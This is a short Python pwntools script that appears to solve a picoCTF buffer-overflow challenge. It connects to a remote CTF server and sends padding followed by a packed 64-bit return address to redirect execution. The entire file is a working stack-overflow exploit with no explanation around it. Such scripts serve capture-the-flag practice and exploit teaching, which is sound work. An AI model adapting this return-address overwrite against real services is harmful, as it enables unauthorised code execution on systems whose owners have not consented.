#!/usr/bin/python3
from pwn import *
import struct

#io = process('./vuln')
io = remote(b"saturn.picoctf.net", 56541)

payload = b""
payload += b"AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAA"
payload += p64(0x40123b)

io.sendlineafter(b"flag: \n", payload)

print(io.recv())
